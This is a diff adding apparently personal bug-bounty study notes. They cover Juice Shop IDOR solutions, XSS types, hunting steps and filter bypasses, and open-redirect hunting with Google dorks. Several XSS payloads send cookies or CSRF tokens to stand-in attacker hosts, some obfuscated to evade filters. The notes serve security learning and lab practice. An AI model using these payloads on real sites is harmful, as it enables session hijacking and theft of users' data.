@@ -672,16 +672,438 @@ www.example.com/changepassword=username+password=password
 #### Exercises
 POSTBOOK hacker 101
 
-Juice
+## Juice shop ##
+
+First IDOR
+
+`First tip: find the IDOR in leaving customer feedback under someone else's user name`
+Solution (intercept the petition with burp and change your email for the admin's email or another user) Of course, must have an account first.
+`You successfully solved a challenge: Forged Review (Post a product review as another user or edit any user's existing review.)`
+
+Ups... that one was about feedback of the products. The solution to customer feedback is different
+
+On the customer feedback change this (the user ID): 
+
+```
+
+{"UserId":22,"captchaId":0,"captcha":"4","comment":"caca (***t1@test1.com)","rating":2}
+```
+for this:
+```
+{"UserId":1,"captchaId":0,"captcha":"4","comment":"caca (***in@juice-sh.op)","rating":2}
+```
+response:
+```
+{"status":"success","data":{"id":9,"UserId":1,"comment":"caca (***in@juice-sh.op)","rating":2,"updatedAt":"2023-10-03T20:44:52.344Z","createdAt":"2023-10-03T20:44:52.344Z"}}
+```
+
+-Become admin
+(modify the parameter from "customer" when you create an account to "admin")
+-Buy something (similar to the porswigger labs)
+
+Exercises:
+
+Business logical errors from portswigger labs.
+
+
+# SQLI #
+
+
+# XSS #
+
+
+Example of a threat on the URL:
+
+```
+https://subscribe.example.com?email=<script>location="http://attacker.com";</script>
+```
+Since the malicious script gets incorporated into the page, the victim’s
+browser will think the script is part of that site. Then the injected script can
+access any resources that the browser stores for that site, including cookies
+
+and session tokens. Attackers can, therefore, use these scripts to steal infor-
+mation and bypass access control.
 
 
 
 
+The previous example can be concatenated with this other one:
+
+```
+<script>image = new Image();
+image.src='http://attacker_server_ip/?c='+document.cookie;</script>
+```
+
+This script contains JavaScript code to load an image from the attacker’s
+server, with the user’s cookies as part of the request. The browser will send
+a GET request to the attacker’s IP, with the URL parameter c (for cookie)
+containing the user’s document.cookie, which is the victim user’s cookie on
+the current site. In this way, attackers can use the XSS to steal other users’
+cookies by inspecting incoming requests on their server logs. Note that
+if the session cookie has the HttpOnly flag set, JavaScript will not be able
+to read the cookie, and therefore the attacker will not be able to exfiltrate
+it. Nevertheless, XSS can be used to execute actions on the victim’s behalf,
+modify the web page the victim is viewing, and read the victim’s sensitive
+information, such as CSRF tokens, credit card numbers, and any other
+details rendered on their page.
+
+
+## Types of XSS ##
+
+
+### There are three kinds of XSS: ###
+**-Stored XSS** 
+
+(Most dangerous, stored on the server, bigger scoope. All the user has to
+do to become a victim is to view a page with the payload embedded,)
+Example: A XSS on the comments in a forum, or comments in a post
+
+
+**-Reflected XSS**
+(usually require the user to click a malicious link.) 
+For example, a query made by an attacker, and then it is interpreted on the browser of the victim
+```
+https://example.com/search?q=<script>alert('XSS attack');</script>
+```
+**-DOM-based**
+.
+The URL parameter isn’t submitted to the server. Instead, it’s used
+locally, by the user’s browser, to construct a web page by using a client-side
+script.
+
+More info:
+https://portswigger.net/web-security/cross-site-scripting/
+dom-based/.
+
+
+This attack do not interact on the server site.
+
+(DOM XSS requires a lot of social engineering to succeed )
 
 
 
+#### Blind XSS
 
 
+Blind XSS vulnerabilities are stored XSS vulnerabilities whose malicious input
+is stored by the server and executed in another part of the application or in
+another application that you cannot see.
 
 
+### Self-XSS
+
+Self-XSS attacks require victims to input a malicious payload themselves.
+This require social engineering if the vulnerability or value can be modify only by the user.
+
+
+## Prevention ##
+To prevent XSS, an application should implement two controls: robust input
+validation and contextual output escaping and encoding.
+
+More info:
+
+https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention
+_Cheat_Sheet.html.
+
+
+## Hunting for XSS
+
+The central principle remains the same: check for reflected user input.
+
+Vulnerabilities can also arise outside normal web applications
+-Such as SMTP, SNMP, and DNS.
+
+#### Advanced attacks and training
+https://www.offensive-security.com/awae-oswe/.
+
+##### Step 1: Look for Input Opportunities
+
+-Don’t limit yourself to text input fields (intercept with burp and modify parameters)
+-Insert your custom string into every user-input opportunity you can find. (xss_by_user)
+-Use ctrl+f to see where are the inputs that you had submitted
+
+
+#### Step 2: Insert Payloads
+
+###### Script alert
+-Test the inputs with an `<script>alert('XSS ');</script>`
+
+This kind of exploits only works on defenseless sites with old frameworks or in IoT
+`Look for some IoT vulnerabilities https://github.com/OWASP/IoTGoat/.`
+
+###### HTML elements
+
+Inserting code into these attributes(if you can)
+Or add a new attrribute(if you can)
+
+
+```
+<img onload=alert('The image has been loaded!') src="example.png">
+```
+
+
+Another way you can achieve XSS is through special URL schemes, like
+javascript: and data:. The javascript: URL scheme allows you to execute
+JavaScript code specified in the URL.
+
+`javascript:alert('XSS')`
+
+`data:<script>alert(XSS)</script>`  <--- you can code this (base64,xxl,url,etc)
+
+
+The URL may sugest you something too
+
+`https://example.com/upload_profile_pic?url=IMAGE_URL`
+
+This creates a img on the html and adds the attribute source to that img
+
+`<img src="IMAGE_URL"/>`
+
+
+#### Closing Out HTML Tags
+
+Original input
+`<img src="USER_INPUT">`
+
+Payload:
+
+`"/><script>location="http://attacker.com";</script>`
+Result:
+
+`<img src=""/><script>location="http://attacker.com";</script>">`
+
+Search XSS pay-loads online for more ideas.
+
+Good way for manual XSS testing is to insert an XSS polyglot (less time consumming)
+https://polyglot.innerht.ml/
+now is here
+https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/
+
+Blind XSS flaws are harder to detect . You can’t test for them by trying to generate an
+alert box. You must use a server and see the petition logs to the server.
+
+`<script src='http://YOUR_SERVER_IP/xss'></script>`
+
+### Step 3: Confirm the Impact ###
+-Test if your payload do what you want
+-Sometimes you must have priviledges (admin) to do what you want
+-Sometimes you must wait a couple of ours or use another account.
+
+### Bypassing XSS Protection
+
+##### Alternative JavaScript Syntax #####
+
+Sometimes filters don't allow the `<script>`
+Original:
+`<img src="USER_INPUT">`
+
+Instead of this:
+
+`<img src="/><script>alert('XSS by Vickie');</script>"/>`
+
+use this:
+
+`<img src="123" onerror="alert('XSS by Vickie');"/>`
+
+or this:
+
+`<a href="javascript:alert('XSS')>Click me!</a>"`
+
+##### Capitalization and Encoding
+
+If doesn't allow `script` maybe allows `scrIPT` browsers generally don't pay attention to this issues
+
+`<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>`
+
+If the application filters special HTML characters, like single and double quotes, you can’t write any strings into your XSS payload directly.
+
+```
+<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,
+47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,
+101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
+```
+Some code:
+Encoding
+```
+<script>
+ function ascii(c){
+return c.charCodeAt();
+}
+encoded = "INPUT_STRING".split("").map(ascii);
+document.write(encoded);
+</script>
+```
+
+## Filter Logic Errors ##
+
+Sometimes the filter eliminates once the dangerous payload, you can bypass it like this
+
+```
+<scrip<script>t>
+location='http://attacker_server_ip/c='+document.cookie;
+</scrip</script>t>
+```
+And then the result will be like this:
+
+```
+<script>location='http://attacker_server_ip/c='+document.cookie;</script>
+```
+
+OWASP bypass techniques 
+
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+
+## Escalating the Attack ##
+
+###### Some affect the server they are critical:
+
+The XSS can affect system administrators and allow attackers to take over their sessions. Since the affected users are accounts of high privilege
+
+You might gain access to customer data, internal files, and API keys. You might even escalate the attack into RCE by uploading a shell or execute scripts as the admin.
+
+###### Users
+
+Most of the time, XSS can be used to read sensitive information on the victim’s page.
+This means that you can use XSS to steal data and escalate your attack from there.
+This can be done by running a script that sends the data back to you.
+For example: 
+If you can steal a user’s CSRF tokens, you can execute actions on their behalf by using
+those tokens to bypass CSRF protection on the site.
+
+Script
+```
+var token = document.getElementsById('csrf-token')[0];
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://attacker_server_ip/?token="+token, true);
+xhr.send(null);
+```
+
+# OPEN REDIRECTS #
+
+##### ON THE URL BOWSER
+
+When you try to see something without credentials you're redirected to the login site for example.
+```
+https://attacker.com/dashboard=https://example.com/login?redirect
+```
+
+Attackers manipulate the redirection from a site for example : 
+
+
+```
+https://example.com/login?redirect=https://attacker.com
+```
+
+##### ON THE REFERRER HEADER
+
+Another common open-redirect technique is referer-based open redi-rect. The referer is an HTTP request header that browsers automatically include.
+
+Referer head-ers are a common way of determining the user’s original location.
+
+Thus, some sites will redi-rect to the page’s referer URL automatically after certain user actions, like login or logout.
+
+Attackers can host a site that links to the victim site to set the referer header of the request, using HTML.
+
+```
+<html>
+<a href="https://example.com/login">Click here to log in to example.com</a>
+</html>
+```
+
+## HUNTING FOR OPEN REDIRECTS ##
+
+#### Step 1: Look for Redirect Parameters ####
+
+
+Start by searching for the parameters used for redirects. These often show
+up as URL parameters like the ones in bold here:
+
+---------------------------------------------------------------
+```
+https://example.com/login?redirect=https://example.com/dashboard
+https://example.com/login?redir=https://example.com/dashboard
+https://example.com/login?next=https://example.com/dashboard
+https://example.com/login?next=/dashboard
+```
+-------------------------------------------------
+
+Work with a proxy.
+
+In addition, take note of the pages that don’t contain redirect parameters in their URLs but still automatically redirect their users. These pages are candidates for referer-based open redirects. To find these pages, you can keep an eye out for 3XX response codes like 301 and 302. These response codes indicate a redirect.
+
+#### Step 2: Use Google Dorks  ####
+
+Set the site search term to your target site:
+
+`site:example.com`
+
+Use of %3D the URL-encoded version of the equal sign (=)
+
+`inurl:%3Dhttp site:example.com`
+
+This search term might find the following pages:
+
+```
+https://example.com/login?next=https://example.com/dashboard
+https://example.com/login?u=http://example.com/settings
+```
+
+Also try using %2F, the URL-encoded version of the slash (/).
+
+`inurl:%3D%2F site:example.com`
+
+This search term will find URLs such as this one:
+```
+https://example.com/login?n=/dashboard
+```
+
+Alternatively, you can search for the names of common URL redirect
+parameters.
+
+```
+inurl:redir site:example.com
+inurl:redirect site:example.com
+inurl:redirecturi site:example.com
+inurl:redirect_uri site:example.com
+inurl:redirecturl site:example.com
+inurl:redirect_uri site:example.com
+inurl:return site:example.com
+inurl:returnurl site:example.com
+inurl:relaystate site:example.com
+inurl:forward site:example.com
+inurl:forwardurl site:example.com
+inurl:forward_url site:example.com
+inurl:url site:example.com
+inurl:uri site:example.com
+inurl:dest site:example.com
+inurl:destination site:example.com
+inurl:next site:example.com
+```
+
+These search terms will find URLs such as the following:
+
+```
+https://example.com/logout?dest=/
+https://example.com/login?RelayState=https://example.com/home
+https://example.com/logout?forward=home
+https://example.com/login?return=home/settings
+```
+
+Note the new parameters you’ve discovered, along with the ones found
+in step 1.
+
+#### Step 3: Test for Parameter-Based Open Redirects ####
+
+Insert a random hostname,then see if the site automatically redirects to the site you specified:
+```
+https://example.com/login?n=http://google.com
+https://example.com/login?n=http://attacker.com
+```
+Some sites will redirect to the destination site immediately after you
+visit the URL, without any user interaction. But for a lot of pages, the
+redirect won’t happen until after a user action, like registration, login, or
+logout. In those cases, be sure to carry out the required user interactions
+before checking for the redirect.
+
+#### Step 4: Test for Referer-Based Open Redirects ####
 
